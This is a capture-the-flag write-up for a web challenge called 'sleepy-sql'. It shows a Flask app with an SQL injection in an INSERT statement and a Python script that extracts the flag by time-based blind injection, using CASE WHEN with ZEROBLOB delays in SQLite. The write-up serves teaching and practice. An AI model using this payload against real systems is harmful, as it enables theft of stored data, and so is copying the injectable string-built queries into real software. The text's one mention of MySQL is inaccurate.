# sleepy-sql

[library.m0unt41n.ch/challenges/sleepy-sql](https://library.m0unt41n.ch/challenges/sleepy-sql) ![](../../resources/web.svg) ![](../../resources/easy.svg) 

# TL;DR

We get a Web app, with no obvious direct attack vector. We work out a way to create side-effect attack,
by making SQLite conditionally slow, depending on the flag contents.

# Code

A simple Flask app, where _"you can leave us a message"_:

```python
from flask import Flask, request, render_template
import sqlite3
import time
from os import environ

FLAG = environ.get("FLAG")
app = Flask(__name__)

# Initialize the database and create the table if it doesn't exist
def init_db():
    conn = sqlite3.connect('messages.db')
    c = conn.cursor()
    c.execute("""
        CREATE TABLE IF NOT EXISTS messages (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT,
            message TEXT
        )
    """)
    
    c.execute(f"INSERT INTO messages (name, message) VALUES ('admin', '{FLAG}')")
    conn.commit()
    conn.close()

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        name = request.form.get('name')
        message = request.form.get('message')
        print(message)
        conn = sqlite3.connect('messages.db')
        c = conn.cursor()
        c.execute(f"INSERT INTO messages (name, message) VALUES ('{name}', '{message}')")
        conn.commit()

        conn.close()
        return "Message saved!"

    return render_template("index.html")

if __name__ == '__main__':
    init_db()
    app.run(host='0.0.0.0', port=5000, threaded=True)
```

# Analysis

It's not so obvious actually:

*   Yes, there is a SQL injection for the `INSERT`
*   But no way to run a `SELECT` (SQLite protests when we try a simple `' ; SELECT ...`)
*   The program is trivial otherwise, and there doesn't seem to be a way to exfiltrate the data

But, interestingly, on the SHC chat, there was a message that *"this challenge has been updated with deployment details"*.
Specifically:

```yaml
services:
  my_service:
    deploy:
      resources:
        limits:
          cpus: '0.05'
          memory: '500M'
```

So, we just need to find a way to make SQLite query "slow", conditionally on something. Like subsequent flag characters.
In MySQL, within `INSERT` statement, that can be achieved with `CASE WHEN` construct
([documentation](https://www.sqlitetutorial.net/sqlite-case/)). And the "slow" operation could be
just inserting a large-enough blob.

Then, we iterate over a) positions in the flag b) possible characters to put on that position - and
make the `INSERT` take different amounts of time, depending on whether the character was correct.

With some experimenting, I found that, for remote instance, using `ZEROBLOB(10000000)` provides more than
a second of additional delay. We can construct the timing attack now:

# Getting the flag:

```python
import requests
import time

URL = "https://fb8dfa2c-b7a7-4156-bdbb-e0d92adf50b6.library.m0unt41n.ch:1337"
CHARSET="abcdefghijklmnopqrstuvwxyz0123456789_ABCDEFGHIJKLMNOPQRSTUVWXYZ{}!#$%&()+,-./:;<=>@[]^`|~"
flag = ''

while not flag.endswith("}"):
    charFound = False
    for c in CHARSET:
        print("Trying: "+flag+c)
        pos = len(flag) + 1  # SUBSTR indices start from 1!!!
        params = {"name": "me", "message": "' || (CASE WHEN (SELECT SUBSTR(message,"+str(pos)+",1) FROM messages WHERE name='admin')='"+c+"' THEN ZEROBLOB(10000000) ELSE 'yes' END) || '"}
        t = time.time()
        html = requests.post(URL, data=params).text;
        t = time.time() - t
        if t > 1.0:
            flag += c
            charFound = True
            break
    if not charFound:
        break
```

---

## `SCD{tw1nkl3_tw1nkl3_l1ttl3_star}`


<hr>

&copy; [muflon77](https://library.m0unt41n.ch/players/805ae1c8-9fe4-5816-b4a4-5057fa6eedb1)
